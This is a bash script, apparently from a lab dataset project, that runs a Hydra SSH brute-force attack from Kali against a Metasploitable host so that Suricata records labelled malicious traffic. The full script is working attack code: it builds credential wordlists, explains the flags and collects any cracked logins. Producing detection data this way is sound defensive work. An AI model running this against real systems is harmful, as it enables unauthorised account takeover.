#!/bin/bash
# ============================================================
# hydra_ssh_brute.sh
# Attack Type: SSH credential brute force
# Tool: Hydra
# Source: Kali Linux (192.168.20.20)
# Target: Metasploitable (192.168.30.20)
#
# What this does:
#   Attempts to authenticate to SSH using lists of common
#   usernames and passwords. Each attempt is a real SSH
#   connection that fails at the authentication stage.
#
# How it differs from previous scripts:
#   Nmap scans:   Read-only reconnaissance (no auth attempts)
#   Metasploit:   Exploit a vulnerability (bypass auth entirely)
#   This script:  Credential attack (try to authenticate legally)
#
# What Suricata will see:
#   ET SCAN SSH BruteForce alerts
#   Rapid repeated TCP connections to port 22
#   Multiple failed authentication patterns
#   High connection rate from single source IP
#
# What the traffic looks like:
#   Each attempt = TCP handshake + SSH version exchange +
#                  key exchange + auth fail + connection close
#   Repeated hundreds of times in rapid succession
#   Very distinctive pattern in flow data
#
# Usage:
#   bash hydra-ssh-brute.sh
#
# After running, log this session in data/session_log.csv:
#   timestamp_start, timestamp_end, hydra_ssh_brute,
#   192.168.30.20, malicious, X attempts, found/not found
# ============================================================

# ── Configuration ────────────────────────────────────────────
TARGET_IP="192.168.30.20"       # Metasploitable
TARGET_PORT="22"                # SSH port
OUTPUT_DIR="/tmp/hydra_results"
mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="${OUTPUT_DIR}/ssh_brute_${TIMESTAMP}.txt"

# ── Wordlists ─────────────────────────────────────────────────
# Kali comes with built-in wordlists at /usr/share/wordlists/
#
# rockyou.txt — 14 million real passwords from a 2009 data breach
# It's compressed by default on Kali — we check and unzip if needed
ROCKYOU="/usr/share/wordlists/rockyou.txt"
ROCKYOU_GZ="/usr/share/wordlists/rockyou.txt.gz"

if [ ! -f "$ROCKYOU" ]; then
    if [ -f "$ROCKYOU_GZ" ]; then
        echo "[*] Unzipping rockyou.txt..."
        gunzip "$ROCKYOU_GZ"
    else
        echo "[ERROR] rockyou.txt not found at /usr/share/wordlists/"
        exit 1
    fi
fi

# For our purposes we use a small subset of rockyou.txt
# Full rockyou against SSH would take days — we want enough
# traffic to generate meaningful patterns, not actually crack it
#
# We'll also try common Metasploitable default credentials:
# msfadmin:msfadmin is the default login — we include it
# deliberately so we get some successful auth traffic too

# Create a targeted username list
# Metasploitable has these accounts by default
cat > /tmp/ssh_users.txt << EOF
root
msfadmin
admin
user
postgres
service
daemon
EOF

# Create a small password list
# First 100 from rockyou + known Metasploitable defaults
# head -100 gives us common passwords without running forever
{
    echo "msfadmin"
    echo "password"
    echo "123456"
    echo "admin"
    echo "root"
    echo "toor"
    echo "service"
    head -100 "$ROCKYOU" 2>/dev/null
} > /tmp/ssh_passwords.txt

# Remove duplicates
sort -u /tmp/ssh_passwords.txt -o /tmp/ssh_passwords.txt

echo "============================================"
echo " Hydra SSH Brute Force"
echo " Started:  $(date '+%Y-%m-%d %H:%M:%S')"
echo " Target:   ${TARGET_IP}:${TARGET_PORT}"
echo " Users:    $(wc -l < /tmp/ssh_users.txt) usernames"
echo " Passwords: $(wc -l < /tmp/ssh_passwords.txt) passwords"
echo "============================================"
echo ""
echo "[!] Record this start time in session_log.csv"
echo ""

# ── Run Hydra ─────────────────────────────────────────────────
# Hydra flags explained:
#
# -L /tmp/ssh_users.txt
#   → Use a file of usernames to try (capital L = file)
#   → Lowercase -l would be a single username
#
# -P /tmp/ssh_passwords.txt
#   → Use a file of passwords to try (capital P = file)
#   → Lowercase -p would be a single password
#
# -t 4
#   → Run 4 parallel connection threads
#   → Higher = faster but more likely to trigger lockouts
#   → SSH servers often rate-limit or block after many failures
#   → 4 is aggressive enough to generate good traffic without
#     completely overwhelming the target
#
# -f
#   → Stop after finding the first valid credential pair
#   → Without this, Hydra tries every combination even after success
#
# -V
#   → Verbose — show each attempt as it happens
#   → Useful to see what's happening in real time
#
# -o ${LOG_FILE}
#   → Save results to a file
#
# ssh://${TARGET_IP}
#   → Protocol and target — "ssh" tells Hydra which module to use

hydra \
    -L /tmp/ssh_users.txt \
    -P /tmp/ssh_passwords.txt \
    -t 4 \
    -f \
    -V \
    -o "$LOG_FILE" \
    "ssh://${TARGET_IP}" \
    2>&1

# ── Cleanup ──────────────────────────────────────────────────
rm -f /tmp/ssh_users.txt /tmp/ssh_passwords.txt

# ── Summary ──────────────────────────────────────────────────
echo ""
echo "============================================"
echo " Brute force complete: $(date '+%Y-%m-%d %H:%M:%S')"
echo " Results saved to: ${LOG_FILE}"
echo "============================================"
echo ""

# Check if any credentials were found
if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
    echo "[+] Valid credentials found:"
    grep "login:" "$LOG_FILE"
else
    echo "[-] No valid credentials found in this run"
    echo "    (Traffic was still generated — that's what we need)"
fi

echo ""
echo "[!] Record this end time in session_log.csv"
echo "[!] Label: malicious"
echo "[!] Scenario: hydra_ssh_brute"
